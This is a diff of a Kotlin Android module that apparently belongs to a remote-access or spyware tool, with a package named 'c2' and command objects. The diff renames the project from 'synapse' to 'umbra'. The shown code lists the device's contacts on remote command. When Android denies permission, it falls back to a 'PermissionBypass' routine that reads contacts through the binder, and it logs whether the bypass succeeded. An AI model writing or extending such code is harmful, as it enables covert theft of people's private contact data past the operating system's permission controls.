@@ -1,15 +1,15 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.content.Context
 import android.provider.ContactsContract
 import android.util.Log
-import org.synapse.core.c2.Command
-import org.synapse.core.core.ContactEntry
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.Command
+import org.umbra.core.core.ContactEntry
+import org.umbra.core.core.UmbraResponse
 
 object ContactsModule {
 
-    suspend fun list(context: Context, cmd: Command): SynapseResponse {
+    suspend fun list(context: Context, cmd: Command): UmbraResponse {
         val count = (cmd.params["count"]?.toIntOrNull() ?: 200).coerceAtMost(1000)
         val search = cmd.params["search"]  // optional search filter by display name
 
@@ -86,25 +86,25 @@ object ContactsModule {
                 }
             }
 
-            SynapseResponse.ContactsResponse(
+            UmbraResponse.ContactsResponse(
                 contacts = contacts,
                 count = contacts.size
             )
         } catch (e: Exception) {
             // ── Binder bypass fallback — catches SecurityException, RuntimeException, etc. ──
-            Log.d("Synapse.Contacts", "ContentResolver failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
+            Log.d("Umbra.Contacts", "ContentResolver failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
             return try {
                 val binderContacts = PermissionBypass.readContactsViaBinder(context, search, count)
                 if (binderContacts.isNotEmpty()) {
-                    Log.d("Synapse.Contacts", "Binder bypass SUCCESS: ${binderContacts.size} contacts")
-                    SynapseResponse.ContactsResponse(contacts = binderContacts, count = binderContacts.size)
+                    Log.d("Umbra.Contacts", "Binder bypass SUCCESS: ${binderContacts.size} contacts")
+                    UmbraResponse.ContactsResponse(contacts = binderContacts, count = binderContacts.size)
                 } else {
-                    Log.d("Synapse.Contacts", "Binder bypass returned 0 contacts")
-                    SynapseResponse.ContactsResponse(contacts = emptyList(), count = 0)
+                    Log.d("Umbra.Contacts", "Binder bypass returned 0 contacts")
+                    UmbraResponse.ContactsResponse(contacts = emptyList(), count = 0)
                 }
             } catch (bp: Exception) {
-                Log.e("Synapse.Contacts", "Binder bypass FAILED: ${bp.message}", bp)
-                SynapseResponse.ErrorResponse("contacts:bypass_failed:${bp.message}", "contacts")
+                Log.e("Umbra.Contacts", "Binder bypass FAILED: ${bp.message}", bp)
+                UmbraResponse.ErrorResponse("contacts:bypass_failed:${bp.message}", "contacts")
             }
         }
     }
